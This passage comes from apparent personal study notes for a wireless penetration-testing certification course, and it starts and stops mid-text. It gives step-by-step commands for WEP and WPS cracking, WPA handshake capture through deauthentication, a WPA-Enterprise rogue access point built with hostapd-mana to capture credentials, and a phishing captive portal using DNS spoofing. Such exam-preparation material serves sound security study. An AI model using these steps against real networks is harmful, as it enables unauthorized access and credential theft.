&lt;Your_MAC&gt; &lt;interface&gt;     ## performing a fake shared key authentication using XOR key flow</p><p>   aireplay-ng -3 -b &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                                      ## performing a ARP Request Replay attack against AP</p><p>   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                                  ## performing a deauthentication attack against AP</p><p>   aircrack-ng &lt;capture_file&gt;                                                                ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)</p><p>   </p></div><div class='page'><h1 class='title level-1'>WPS cracking</h1><br/><p>wash -i mon0</p><p></p><p>reaver -i wlan0  -b bssid -d delayInSecondes30 -S -N -vv     ---- trying all pin</p><p></p><p>reaver -i wlan0  -b bssid  -p sepcific_pin -vv</p><p></p><p><img src="images/36-1.png" alt="images/36-1.png" /></p><p></p></div><div class='page'><h1 class='title level-1'>WPA/WPA2</h1><br/><p>Step 1: ifconfig(interface configuration) : To view or change the configuration of the network interfaces on your system.</p><p></p><p>ifconfig</p><p></p><p></p><p></p><p>Step 2: Stop the current processes which are using the WiFi interface.</p><p></p><p>airmon-ng check kill</p><p></p><p></p><p></p><p>Step 3: To start the wlan0 in monitor mode.</p><p></p><p>airmon-ng start wlan0</p><p></p><p></p><p></p><p>Step 4: To view all the Wifi networks around you.</p><p></p><p>airodump-ng wlan0mon</p><p></p><p></p><p>Step 5: To view the clients connected to the target network.</p><p></p><p>airodump-ng -c 1 --bssid 80:35:C1:13:C1:2C -w /root/anyname wlan0 </p><p>(we have to capture handshake here)</p><p></p><p>-c : channel of wifi</p><p>--bssid : mac of wifi</p><p>-w : writing data to file (.cap file)</p><p></p><p></p><p>Step 6: Open a new terminal window to disconnect the clients connected to the target network. (to capture handshake easily)</p><p></p><p>aireplay-ng -0 10 -a 80:35:C1:13:C1:2C wlan0mon</p><p>(WPA HANDSHAKE WILL BE FOUND)</p><p>where, </p><p>    aireplay-ng : To inject frames</p><p>    -0 : For deauthentication</p><p>    10 : No. of deauthentication packets to be sent</p><p>    -a : For the bssid of the target network</p><p>    wlan0mon : Name of the interface.</p><p></p><p>Step 7. To decrypt the password. Open the Files Manager.</p><p></p><p></p><p>Here,</p><p></p><p>    hacking-01.cap is the file you need.</p><p></p><p>Step 8 :</p><p></p><p> aircrack-ng -a2 -b 80:35:C1:13:C1:2C -w /user/share/wordlists/passwords.txt /root/hacking-01.cap</p><p></p><p>where,</p><p>    aircrack-ng : 802.11 WEP and WPA-PSK keys cracking program</p><p>    -a : -a2 for WPA2 &amp; -a for WPA network</p><p>    -b : The BSSID of the target network</p><p>    -w : Location of the wordlist file</p><p>    /root/hacking-01.cap : Location of the cap file</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div><div class='page'><h1 class='title level-1'>WPA-E</h1><br/><p>WPA Enterprise uses ExtensibleAuthentication Protocol or EAP<h2>.</h2></p><p>EAP is a framework for authentication,which allows a number of differentauthentication schemes or methods.Authentication is done using a RemoteAuthentication Dial-In User Service or RADIUS server. The client authenticates using a number of EAP frames, depending on the agreed upon authentication scheme, which are relayed by the AP to the RADIUS server. If authentication is successful, the result is then used as Pairwise Master Key for the 4-way handshake, as opposed to PSK, where the passphrase is derived to generate the PMK. Authentication to a RADIUS server with most common EAP methods, requires the use of certificates on the server side at the very least. Some older, now deprecated EAP methods don’t require certificates. Although a number of authentication schemes are possible, only some of them are commonly used, due to their security, and integration with existing operating systems. It is common to use a username and password to authenticate which could be tied to domain credentials. We’ll go over a few EAPs commonly used on Wi-Fi networks. EAP Transport Layer Security or EAP-TLS is one of the most secure authentication methods, as it uses certificates on the server side and client side, instead of a login and password, so the client and server mutually authenticate each other. EAP Tunneled Transport Layer Security, as the name suggests, also uses TLS. As opposed to EAP-TLS, it does not necessarily need client certificates. It creates a tunnel and then exchanges the credentials using one of the few possible different inner methods (also called phase 2), such as Challenge-Handshake Authentication Protocol, (CHAP) Authentication Protocol, Microsoft CHAP, or MS-CHAPv2. Similarly to EAP-TTLS, Protected Extensible Authentication Protocol (PEAP), also creates a TLS tunnel before credentials are exchanged. Although different methods can be used within PEAP, MS-CHAPv2 is a commonly used inner method. PEAP and EAP-TLS mostly differ on how the data is exchanged inside the TLS tunnel.</p><p></p><p></p><p><img src="images/19-1.png" alt="images/19-1.png" /></p><p></p><p>MGT -- means WPA -E</p><p></p><p></p><p></p><p>1. Capture handshake using deauthintication</p><p>2. open cap file in wireshark </p><p>• user filter → <span style="color:#e01b24;">wlan.bssid==&lt;bssid&gt; &amp;&amp; tls.handshake.certificate</span> &amp;&amp; eap</p><p>• route to extensible authentication protocol &gt; Transport layer security&gt;tlsv1 handshake protocol:certificate &gt; handshake protocol :certificate&gt;certificates</p><p>•  in certificates there are more certificates export them to using right click export packet bytes you can use name cert.der</p><p>• use <span style="color:#e01b24;">openssl x509 -inform der -in cert.der -text</span>  command to read cert.der</p><p>• you can convert der to pem using : <span style="color:#e01b24;">openssl x509 -inform der -in cert.der -outform pem -out output.crt</span></p><p></p><p>delete certs  and dh file --- make destroycerts</p><p>3. need to create certificates which are similar to the ones we found we can use the ones available in radius server directory</p><p>   <span style="color:#e01b24;">/etc/freeradius/3.0/certs/ca.cnf </span>,  here we will edit [certificate_authority] fields to match our target CA certificate to appear less suspicious to clients</p><p>in case they inspect the certificate.</p><p>• e.g </p><p><img src="images/19-2.png" alt="images/19-2.png" /></p><p></p><p>4. This information needs to be updated in the<span style="color:#e01b24;"> server file. → /etc/freeradius/3.0/certs/server.cnf</span></p><p>	same as we did with CA certificate edit the [server] fields to match our target server certificate.</p><p>e.g</p><p><img src="images/19-3.png" alt="images/19-3.png" /></p><p></p><p>We’ll skip the client certificate because we don’t need it.</p><p></p><p>5. Now , we’ll build the certificates.</p><p>• first need to regenerate Diffie-Hellman(dh) parameters, with a 2048 bit key </p><p>• to do this we need to delete old dh file → <span style="color:#e01b24;">/etc/freeradius/3.0/certs - user rm dh</span></p><p>• then to regenerate we will use <span style="color:#e01b24;">make</span> command</p><p></p><p>6. we will create our own rogue AP with hostapd-mana</p><p>• create the hostapd-mana configuration file,</p><p>#basics</p><p>ssid=playtronics</p><p>interface=wlan0</p><p>driver=nl80211</p><p>channel=1</p><p>hw_mode=g</p><p></p><p>#setting up hostapd as EAP server</p><p>ieee8021x=1</p><p>eap_server=1</p><p></p><p>#EAP user file we created after this file in next step</p><p>eap_user_file=/etc/hostapd-mana/mana.eap_user</p><p></p><p>#Certificate paths we created</p><p>ca_cert=/etc/freeradius/3.0/certs/ca.pem</p><p>server_cert=/etc/freeradiu/3.0/certs/server.pem</p><p>private_key=/etc/freeradius/3.0/certs/server.key</p><p></p><p>#password is whatever for private key</p><p>private_key_password=whatever</p><p>dh_file=/etc/freeradiu/3.0/certs/dh    or dh_file=/etc/freeradiu/3.0/certs/dhpem ---- whaterever the name is</p><p></p><p>#open authentication</p><p>auth_algs=1</p><p>wpa=3</p><p></p><p>#wpa enterprise</p><p>wpa_key_mgmt=WPA-EAP</p><p>wpa_pairwise=CCMP TKIP</p><p></p><p>#enable Mana WPE</p><p>mana_wpe=1</p><p></p><p>#store credentials in that file</p><p>mana_credout=/tmp/hostapd.credout</p><p></p><p>#Send EAP success, so client thinks its connected</p><p>mana_eapsuccess=1</p><p></p><p>#EAP TLS MitM</p><p>mana_eaptls=1	</p><p></p><p></p><p>7. We will now create a hostapd-mana user file.</p><p>• /etc/hostapd-mana/mana.eap_user</p><p></p><p>* PEAP,TTLS,TLS,MD5,GTC,FAST</p><p>&quot;t&quot; MD5,GTC,MSCHAPV2,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2 &quot;1234TEST&quot; [2]</p><p></p><p></p><p>8. start hostapd-mana using hostapd-mana /etc/hostapd-mana/mana.conf</p><p>9. When a victim attempts to authenticate to our AP, the login attempt is captured.</p><p>10. we will use asleap to crack password hash asleap -C  -R  -W wordlist(e.g /usr/share/john/password.lst)</p></div><div class='page'><h1 class='title level-2'>WPA-E info</h1><br/><p>Each user uses his own user and password (if client certificates are not used).</p><p></p><p></p><p><img src="images/20-1.png" alt="images/20-1.png" /></p><p></p><p></p><p>two files are need </p><p></p><p>1. mana.conf :-</p><p></p><p><img src="images/20-2.png" alt="images/20-2.png" /></p><p></p><p>2. hostapd.eap_users  i.e eap_users_file</p><p></p><p><img src="images/20-3.png" alt="images/20-3.png" /></p><p></p><p>• means for everbody and they can use any authenication</p><p>• “t” means for tunneled mode </p><p></p><p>total certs present for WPA-E</p><p><img src="images/20-4.png" alt="images/20-4.png" /></p><p></p><p></p><p></p><p></p><p>what is sycophant?</p><p><img src="images/20-5.png" alt="images/20-5.png" /></p><p></p></div><div class='page'><h1 class='title level-2'>more info</h1><br/><p></p><p><h3>WPA2 Enterprise:</h3></p><p><h3>Look for WPA MGT network in airodump</h3></p><p><h3>Grab cert files from wireshark / tshark traffic using tls.handshake.type == 11,3 or tls.handshake.certificate filters</h3></p><p>• view Packet Details &gt;&gt; TLSv1 Record Layer: Handshake Protocol: Certificate</p><p>• save certificates to file, right click cert string and click Export Packet Bytes</p><p></p><p><h3>View SSL cert info:</h3></p><p><code>openssl x509 -inform der -in CERTIFICATE_FILENAME -text</code></p><p><code></code></p><p><h3>Use freeradius to provide fake cert to clients</h3></p><p>◇ alter certificate_authority block in /etc/freeradius/3.0/certs/ca.cnf:</p><p></p><p>    [certificate_authority]</p><p>    countryName             = US</p><p>    stateOrProvinceName     = {2 letter state}</p><p>    localityName            = {City}</p><p>    organizationName        = {Company Name}</p><p>    emailAddress            = {Email}</p><p>    commonName              = &quot;Such and Such Certificate Authority&quot;</p><p>    </p><p>    </p><p>• alter server block in /etc/freeradius/3.0/certs/server.cnf:</p><p></p><p>    [server]</p><p>    countryName             = US</p><p>    stateOrProvinceName     = {2 letter state}</p><p>    localityName            = {City}</p><p>    organizationName        = {Company Name}</p><p>    emailAddress            = {Email}</p><p>    commonName              = &quot;Such and Such Certificate Authority&quot;</p><p>    </p><p>    </p><p>• change dir to /etc/freeradius/3.0/certs/ and run:</p><p></p><p>rm dh &amp;&amp; make</p><p> </p><p> </p><p>• YOU WILL GET AN ERROR, but it doesn&#39;t matter</p><p></p><p><h3>Setup hostapd-mana for the rogue AP using the (updated!) </h3><code><h3>mana.conf</h3></code><h3> file, move to </h3><code><h3>/etc/hostapd-mana/mana.conf</h3></code></p><p><h3>Use mana.eap_user file, move to </h3><code><h3>/etc/hostapd-mana/mana.eap_user</h3></code></p><p><h3>Start hostapd-mana:</h3></p><p><code>hostapd-mana /etc/hostapd-mana/mana.conf</code></p><p><code></code></p><p><h3>Hostapd-mana will output asleap commands, find a user with a successful login (from wireshark traffic) and run command like so:</h3></p><p><code>&lt;asleap command&gt; -W /usr/share/john/password.lst</code></p><p><code></code></p><p></p><p><h3>Create </h3><code><h3>wpa_supplicant.conf</h3></code><h3> file:</h3></p><p><code>network={</code></p><p><code>  ssid=&quot;NetworkName&quot;</code></p><p><code>  scan_ssid=1</code></p><p><code>  key_mgmt=WPA-EAP</code></p><p><code>  identity=&quot;Domain\username&quot;</code></p><p><code>  password=&quot;password&quot;</code></p><p><code>  eap=PEAP</code></p><p><code>  phase1=&quot;peaplabel=0&quot;</code></p><p><code>  phase2=&quot;auth=MSCHAPV2&quot;</code></p><p><code>}</code></p><p><code></code></p><p><h3>Connect to network:</h3></p><p><code><h3>wpa_supplicant -c &lt;config file&gt;</h3></code></p><p><h3>Don&#39;t forget the grab and submit the proof.</h3></p></div><div class='page'><h1 class='title level-2'>more n more</h1><br/><p></p><p></p><p></p><p></p><p><a href="https://youtu.be/Ra0dGPYScLQ">https://youtu.be/Ra0dGPYScLQ</a></p><p></p><p></p><p><img src="images/22-1.png" alt="images/22-1.png" /></p><p></p><p></p><p><img src="images/22-2.png" alt="images/22-2.png" /></p><p></p><p></p><p><img src="images/22-3.png" alt="images/22-3.png" /></p><p></p><p></p><p>how to break wpa e</p><p></p><p><img src="images/22-4.png" alt="images/22-4.png" /></p><p></p><p></p><p>tail -f /usr/local/var/log/radius/freeradius-server-wpe.log -n 0</p><p></p><p></p><p>to crack we give challenge response to asleap</p><p></p><p><img src="images/22-5.png" alt="images/22-5.png" /></p><p></p><p></p><p></p><p>security </p><p></p><p><img src="images/22-6.png" alt="images/22-6.png" /></p></div><div class='page'><h1 class='title level-1'>Bettercap</h1><br/><p>bettercap is a popular tool for Wi-Fi assessments. It shares some capabilities with airodump-ng, aireplay-ng, and airbase-ng or hostapd-mana. Unlike many of the other tools, bettercap provides some interface flexibility. We can interface with it using an interactive terminal, scripting language, or web UI.</p><p></p><p></p><p>The main functionality of bettercap is separated into six main modules. </p><p>our of the modules have to do with the technologies supported by bettercap: Bluetooth LE,1 HID on 2.4Ghz,2 Ethernet,3 and Wi-Fi.4 </p><p>The Core module helps us run commands specific to bettercap. Utils works with utilities like GPS or MAC address changer. Some modules, for example Ethernet, also have submodules (spoofers, proxies, etc.).</p><p></p><p></p><p>Each module contains commands and parameters.</p><p>The commands are the various actions that bettercap can take within a specific module (for example, deauthentication within the Wi-Fi module). </p><p></p><p>The parameters control the configuration of the module (for example, how often the Wi-Fi module hops between channels).</p><p></p><p></p><p><h3>We can set parameters by using the </h3><strong><h3>set</h3></strong><h3> command, passing the parameter as the first argument and the value of the parameter as the second argument. For example, </h3><strong><h3>set wifi.hop.period 200</h3></strong><h3> will set the channel-hopping period to 200 milliseconds.</h3></p><p></p></div><div class='page'><h1 class='title level-2'>Essentials</h1><br/><p></p><p>To start bettercap, we will use the bettercap command and pass in the wireless interface using the -iface argument followed by the name of the interface, wlan0 in this case. </p><p></p><p>sudo bettercap -iface wlan0</p><p></p><p></p><p></p><p><h2>Wi-Fi Module</h2></p><p></p><p><h3>The bettercap Wi-Fi module allows us to do things like scan the Wi-Fi spectrum, deauthenticate clients, capture WPA/WPA2 handshakes, and create APs by spoofing beacons.</h3></p><p></p><p><h3>There are a several commands in the Wi-Fi module that will be useful to us.</h3></p><p>• <strong>recon</strong>:<sup><a href="https://portal.offensive-security.com/courses/pen-210/books-and-videos/modal/modules/bettercap-essentials/wi-fi-module/wi-fi-module#fn1">1</a></sup> Scan the 802.11 spectrum for APs and capture WPA/WPA2 handshakes.</p><p>• <strong>deauth</strong>:<sup><a href="https://portal.offensive-security.com/courses/pen-210/books-and-videos/modal/modules/bettercap-essentials/wi-fi-module/wi-fi-module#fn2">2</a></sup> Deauthenticate clients from an AP.</p><p>• <strong>show</strong>:<sup><a href="https://portal.offensive-security.com/courses/pen-210/books-and-videos/modal/modules/bettercap-essentials/wi-fi-module/wi-fi-module#fn3">3</a></sup> Display the discovered wireless stations.</p><p>• <strong>ap</strong>:<sup><a href="https://portal.offensive-security.com/courses/pen-210/books-and-videos/modal/modules/bettercap-essentials/wi-fi-module/wi-fi-module#fn4">4</a></sup> Create a rogue AP.</p><p></p><p></p><p></p><p></p><p><h3>Discovering APs</h3></p><p>The wifi.recon command will start the Wi-Fi module and allow us to discover nearby APs. </p><p>wifi.recon on</p><p></p><p></p><p>Wifi.show command, which will list the discovered wireless stations.</p><p><img src="images/32-1.png" alt="images/32-1.png" /></p><p></p><p><h3>Using the </h3><strong><h3>ticker</h3></strong><sup><a href="https://portal.offensive-security.com/courses/pen-210/books-and-videos/modal/modules/bettercap-essentials/wi-fi-module/discovering-aps#fn2">2</a></sup><h3> module in bettercap, we can periodically execute multiple commands. Instead of manually running </h3><strong><h3>wifi.show</h3></strong><h3> when we want to inspect the table, we can use a ticker to clean the output and show the table.</h3></p><p><h3>The default refresh interval is one second.</h3> <h3>If we need to, we can change this by setting the </h3><em>ticker.period</em><h3> parameter to the amount of seconds bettercap should wait before rerunning the ticker commands.</h3></p><p></p><p><img src="images/32-2.png" alt="images/32-2.png" /></p><p></p><p></p><p>E.g</p><p></p><p><h3>we have a list of WPA2 APs, let&#39;s take a look at the clients connected to an AP. In order to list the clients, we will use a BSSID with the </h3><strong><h3>wifi.recon</h3></strong><h3> command.</h3></p><p></p><p><img src="images/32-3.png" alt="images/32-3.png" /></p><p></p><p></p><p></p><p></p><p></p><p><h3>Deauthenticating a Client</h3></p><p></p><p>I<h3>n bettercap, we&#39;ll deauthenticate clients by using the </h3><strong><h3>wifi.deauth</h3></strong><h3> command. The command accepts a MAC address as a parameter where the value could be. </h3></p><p></p><p>wifi.deauth c6:2d:56:2a:53:f8</p><p></p><p><img src="images/32-4.png" alt="images/32-4.png" /></p><p></p><p>to deauthenicate all</p><p><img src="images/32-5.png" alt="images/32-5.png" /></p><p></p><p></p><p></p><p><h3>Wi-Fi handshakes </h3></p><p></p><p><img src="images/32-6.png" alt="images/32-6.png" /></p><p></p></div><div class='page'><h1 class='title level-2'>Addiional</h1><br/><p></p><p>Caplets</p><p>Caplets are files that allow us to quickly run a series of commands without having to manually type each one into the interactive terminal. Caplet files have a .cap file extension.</p><p></p><p>We can write our own caplets, but let&#39;s examine one of the examples provided by bettercap first. The example caplets are in the /usr/share/bettercap/caplets/ directory.</p><p></p><p><img src="images/33-1.png" alt="images/33-1.png" /></p><p></p><p>we can use the -caplet argument when starting bettercap.</p><p>sudo bettercap -iface wlan0 -caplet deauth_corp.cap</p><p></p><p></p><p></p><p>Web Interface</p><p>bettercap&#39;s interactive terminal has some disadvantages. For example, the table that was displayed when we ran wifi.show would become unusable in an area with too many APs. Thankfully, bettercap&#39;s web interface allows us to display the information in a more concise way. In addition, the web interface allows us to control a bettercap instance remotely.</p><p></p><p>The bettercap web interface runs on port 443. However, the interface on port 443 makes calls to the API server on port 8083. </p><p></p><p><em><h3>If we wanted to only run bettercap locally, we would use the http-ui caplet instead of the https-ui caplet. The http-ui caplet starts the HTTP listener on the loopback interface instead of on all interfaces.</h3></em></p><p></p><p>sudo bettercap -iface wlan0 -caplet http-ui</p><p></p><p></p><p><img src="images/33-2.png" alt="images/33-2.png" /></p><p></p><p></p></div><div class='page'><h1 class='title level-1'>Attacking Captive Portals</h1><br/><p>hostapd -d conffile.conf</p><p></p></div><div class='page'><h1 class='title level-2'>OSWP</h1><br/><p>network is WPA-PSK or WPA2-PSK</p><p></p><p>Opportunistic Wireless Encryption(OWE) also sometimes called Enhanced Open can encrypt the connection without requiring a passphrase.This would ensure that credentials sent tous are safe from interception</p><p></p><p></p><p>1. Information Gathering about AP</p><p>2. setting up captive portal</p><p></p><p></p><p>2 &gt; </p><p></p><p>We’ll also use PHP scripts tosave user entered credentials and then redirect the user toa success or failure page</p><p></p><p><img src="images/24-1.png" alt="images/24-1.png" /></p><p></p><p>make a directory under /var/www/html/portal</p><p></p><p><img src="images/24-2.png" alt="images/24-2.png" /></p><p></p><p></p><p>We will also need to copy the assets</p><p>and old-site directoriesto the portal sub-directory</p><p></p><p></p><p></p><p>after creating a captive portal next is networking </p><p>• We will first assign an IP addressto our wlan0 interface</p><p><img src="images/24-3.png" alt="images/24-3.png" /></p><p></p><p></p><p>• the first thing the userwill do is request a DHCP lease  We will provide it using dnsmasq, a small DNS and DHCPserver we can install with apt</p><p></p><p>mousepad file-dnsmasq.conf</p><p></p><p></p><p>DHCP -</p><p><img src="images/24-4.png" alt="images/24-4.png" /></p><p></p><p></p><p></p><p>DNS - </p><p><img src="images/24-5.png" alt="images/24-5.png" /></p><p></p><p></p><p>start dnsmasq withthe configuration file option</p><p><img src="images/24-6.png" alt="images/24-6.png" /></p><p></p><p></p><p>to stop dsnmasq kill process of dnsmasq may refer /var/run/dasmasq.pid for reference</p><p></p><p>install nftables</p><p></p><p>sudo nft add table ip nat</p><p></p><p><img src="images/24-7.png" alt="images/24-7.png" /></p><p></p><p></p><p></p><p>In Apache’s site configuration, we need to add mod_rewriteand mod_alias rules  so that the captiveportal is set properly.</p><p><img src="images/24-8.png" alt="images/24-8.png" /></p><p></p><p></p><p><img src="images/24-9.png" alt="images/24-9.png" /></p><p></p><p></p><p>Let’s enable the rewrite andalias modules using a2enmod.</p><p></p><p><img src="images/24-10.png" alt="images/24-10.png" /></p><p></p><p></p><p><img src="images/24-11.png" alt="images/24-11.png" /></p><p></p><p></p><p></p><p>for chrome </p><p></p><p><img src="images/24-12.png" alt="images/24-12.png" /></p><p></p><p></p><p></p><p></p><p>setting up and running rogue ap</p><p></p><p>use hostapd</p><p></p><p>we will not use encryption</p><p><img src="images/24-13.png" alt="images/24-13.png" /></p><p></p><p>run hostapd</p><p></p><p></p><p>checking syslog apache log</p><p></p><p>after entering successul credentials</p><p></p><p></p><p><img src="images/24-14.png" alt="images/24-14.png" /></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div><div class='page'><h1 class='title level-2'>my notes</h1><br/><p>Networking setup</p><p></p><p>1. assign an IP addressto our wlan0 interface</p><p></p><p></p><p>sudo ip addr add 192.168.1.1/24 dev wlan1</p><p>sudo ip link set wlan1 up</p><p></p><p>OR</p><p></p><p>ifconfig wlan1 down</p><p>ifconfig wlan1 192.168.1.1/24 </p><p>ifconfig wlan1 up</p><p></p><p>always check using ifconfig</p><p></p><p>2. create dnsmasq for providing dhcp ip and dns server</p><p></p><p>gedit dnsmasq.conf</p><p></p><p><code><small># Main options</small></code></p><p><code><small># http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html</small></code></p><p><code><small>domain-needed</small></code></p><p><code><small>bogus-priv</small></code></p><p><code><small>no-resolv</small></code></p><p><code><small>filterwin2k</small></code></p><p><code><small>expand-hosts</small></code></p><p><code><small>domain=localdomain</small></code></p><p><code><small>local=/localdomain/</small></code></p><p><code><small></small></code></p><p><code><small># Only listen on this address. When specifying an</small></code></p><p><code><small># interface, it also listens on localhost.</small></code></p><p><code><small># We don&#39;t want to interrupt any local resolution</small></code></p><p><code><small># since the DNS responses will be spoofed</small></code></p><p><code><small>listen-address=192.168.1.1</small></code></p><p><code><small></small></code></p><p><code><small># DHCP range</small></code></p><p><code><small>dhcp-range=192.168.1.100,192.168.1.199,12h</small></code></p><p><code><small>dhcp-lease-max=100</small></code></p><p><code><small></small></code></p><p><code><small></small></code></p><p><code><small># We also need to do DNS spoofing3 so that the response for most DNS requests will point back to us with the exception of rare cases. We&#39;ll use dnsmasq again. To do this, we will append the following to the configuration file we just created.</small></code></p><p><code><small></small></code></p><p><code><small># This should cover most queries</small></code></p><p><code><small># We can add &#39;log-queries&#39; to log DNS queries</small></code></p><p><code><small>address=/com/192.168.1.1</small></code></p><p><code><small>address=/org/192.168.1.1</small></code></p><p><code><small>address=/net/192.168.1.1</small></code></p><p><code><small></small></code></p><p><code><small># Entries for Windows 7 and 10 captive portal detection</small></code></p><p><code><small>address=/dns.msftncsi.com/131.107.255.255</small></code></p><p></p><p>then start dnsmasq by running dnsmasq --conf-file=enterthefile.conf_path_here</p><p></p><p>to stop dsnmasq kill process of dnsmasq may refer /var/run/dasmasq.pid for reference</p><p></p><p></p><p>to check  dnsmasq running successfuly</p><p>sudo tail /var/log/syslog | grep dnsmasq</p><p>netstat -lnp  listening on port 53 and 67 i.e dns and dhcp</p><p></p><p></p><p></p><p></p><p></p><p>3. Sometimes clients ignore DNS settings provided in the DHCP lease, and we will use an nftables rule to force redirect all DNS requests (UDP to port 53 only--TCP port 53 is for zone transfer) back to our server.</p><p></p><p><small>sudo apt install nftables</small></p><p><small>sudo nft add table ip nat</small></p><p><small>sudo nft &#39;add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }&#39;</small></p><p><small>sudo nft add rule ip nat PREROUTING iifname &quot;wlan1&quot; udp dport 53 counter redirect to :53</small></p><p></p><p></p><p>4. In Apache&#39;s site configuration, we need to add mod_rewrite7 and mod_alias7:1 rules so that the captive portal is set properly. We&#39;ll add the following lines in /etc/apache2/sites-enabled/000-default.conf before the VirtualHost closing tag.</p><p></p><p><code><span style="background-color:#77767b;"> </span></code><code><small> # Apple</small></code></p><p><code><small>  RewriteEngine on</small></code></p><p><code><small>  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]</small></code></p><p><code><small>  RewriteCond %{HTTP_HOST} !^192.168.1.1$</small></code></p><p><code><small>  RewriteRule ^(.*)$ </small></code><code><a href="http://192.168.1.1/portal/index.php">http://192.168.1.1/portal/index.php</a></code><code><small> [L,R=302]</small></code></p><p><code><small></small></code></p><p><code><small>  # Android</small></code></p><p><code><small>  RedirectMatch 302 /generate_204 </small></code><code><a href="http://192.168.1.1/portal/index.htm">http://192.168.1.1/portal/index.htm</a></code><code><small></small></code></p><p><code><small></small></code></p><p><code><small>  # Windows 7 and 10</small></code></p><p><code><small>  RedirectMatch 302 /ncsi.txt </small></code><code><a href="http://192.168.1.1/portal/index.htm">http://192.168.1.1/portal/index.htm</a></code><code><small></small></code></p><p><code><small>  RedirectMatch 302 /connecttest.txt </small></code><code><a href="http://192.168.1.1/portal/index.htm">http://192.168.1.1/portal/index.htm</a></code><code><small></small></code></p><p><code><small></small></code></p><p><code><small>  # Catch-all rule to redirect other possible attempts</small></code></p><p><code><small>  RewriteCond %{REQUEST_URI} !^/portal/ [NC]</small></code></p><p><code><small>  RewriteRule ^(.*)$ </small></code><code><a href="http://192.168.1.1/portal/index.htm">http://192.168.1.1/portal/index.htm</a></code><code><small> [L]</small></code><code><span style="background-color:#77767b;"></span></code></p><p><code><span style="background-color:#77767b;"></span></code></p><p></p><p></p><p> → These additions will require two modules to be enabled. For the first four and the last three instructions, we need the redirect module. For the two &quot;RedirectMatch&quot; additions in-between, we need the alias module.</p><p> </p><p><strong><code><small>sudo a2enmod rewrite</small></code></strong><code><small></small></code></p><p><code><small>Enabling module rewrite.</small></code></p><p><code><small>To activate the new configuration, you need to run:</small></code></p><p><code><small>  systemctl restart apache2</small></code></p><p><code><small></small></code></p><p><code><small>kali@kali:~$ </small></code><strong><code><small>sudo a2enmod alias</small></code></strong><code><small></small></code></p><p><code><small>Module alias already enabled</small></code></p><p></p><p></p><p>5. check portal using → firefox 127.0.0.1/portal/index.htm</p><p></p><p></p><p>6. Set up hostapd -conf d</p><p></p><p>We will be creating a 802.11n AP with the exact same SSID and channel as the AP we are targeting, but we won&#39;t be using any encryption.</p><p></p><p><code><small>interface=wlan0</small></code></p><p><code><small>ssid=MegaCorp One Lab</small></code></p><p><code><small>channel=11</small></code></p><p><code><small></small></code></p><p><code><small># 802.11nho</small></code></p><p><code><small>hw_mode=g</small></code></p><p><code><small>ieee80211n=1</small></code></p><p><code><small></small></code></p><p><code><small># Uncomment the following lines to use OWE instead of an open network</small></code></p><p><code><small>#wpa=2</small></code></p><p><code><small>#ieee80211w=2</small></code></p><p><code><small>#wpa_key_mgmt=OWE</small></code></p><p><code><small>#rsn_pairwise=CCMP</small></code><small></small></p><p><small></small></p><p></p><p>hostapd file.config</p></div><div class='page'><h1 class='title level-1'>Kismet</h1><br/><p>Kismet is a versatilewireless capture tool.</p><p></p><p>It can capture data of different wireless technologies such as Wi-Fi, Bluetooth,2 and nRF3 signals, or it can use Software Defined Radio (SDR)4 to capture ADS-B,5 Automatic meter reading (AMR),6 433MHz,7 and more. For now, we will focus on its Wi-Fi capabilities.</p><p></p><p>Kismet captures raw wireless frames and decodes them to identify access points and devices on the network. When paired with a GPS8 device, Kismet also includes estimated geolocation data for the discovered devices.9 We can use this data to get a rough idea of where devices are in relation to access points.</p><p></p><p></p><p>There are a few ways we could familiarize ourselves with Kismet, but we&#39;ll begin with the configuration files.1 These can be found in /etc/kismet/.</p><p></p><p></p><p>kismet_80211.conf configures settings related to Wi-Fi.</p><p>kismet_alerts.conf configures Kismet&#39;s intrusion detection and alert subsystem. Kismet includes a Wireless Intrusion Detection System2 (WIDS), but we will not cover that particular functionality in this module.</p><p>kismet.conf is the master configuration file for Kismet.</p><p>kismet_filter.conf configures filtering rules for devices and packets.</p><p>kismet_httpd.conf configures Kismet&#39;s web server.</p><p>kismet_logging.conf configures how and where Kismet creates log files.</p><p>kismet_memory.conf configures Kismet&#39;s memory usage.</p><p>kismet_uav.conf contains rules for detecting unmanned aerial vehicles3 (UAV) and drones.</p><p></p><p></p><p></p><p>Output formats --  kismet(the default one), PcapPpi , PcapNg.</p><p></p><p>• kismet includes all the gathered data in sqlite DB -- contain multiple Data link packets - e.g wifi bluetooth mix etc.</p><p>• PcapPpi format is a legacy Pcap format --- only contain one Data link types packet</p><p>• PcapNg formatis the modern Pcap format. -- contain multiple Data link packets - e.g wifi bluetooth mix etc., also is more preferred because it allows us to use the results in other tools, such as Wireshark.</p><p></p><p></p><p></p><p>By default, Kismet creates log files in the current working directory. Let&#39;s change this to a centralized location in our override file. We will also change the log types to include PcapNg logs. The kismet log is useful, but as we mentioned previously, if we want to use the data from Kismet in other tools, we will want to log in the PcapNg format as well.</p><p></p><p>sudo mkdir /var/log/kismet</p><p></p><p></p><p>Next, we will create the kismet_site.conf file with our override settings for log_prefix to store data in the new directory and log_types to create log files in kismet and PcapNg formats.</p><p></p><p><img src="images/27-1.png" alt="images/27-1.png" /></p><p></p><p></p></div><div class='page'><h1 class='title level-2'>Essentials</h1><br/><p></p><p>Installation :</p><p>sudo apt install kismet</p><p></p><p>Usage :-</p><p>kismet -c wlan0:channlels=&quot;4,5,6&quot;  --daemonize</p><p></p><p>-c : to specify our data source.</p><p>:channlels=&quot;4,5,6&quot;  - to limit the channels </p><p>--daemonize = to run in background</p><p> </p><p>we can&#39;t scroll back through the output and search for anything we might have missed. We can disable this feature with the command line option --no-ncurses to get all output on new lines in the console.</p><p></p><p> sudo kismet -c wlan0 --no-ncurses</p><p> </p><p> </p><p> Web Interface :-</p><p>Kismet includes a webserver1 and a web UI that is accessible on localhost:2501 by default.</p><p> </p><p>securing kismet web interface</p><p></p><p>By default, the Kismet web server listens 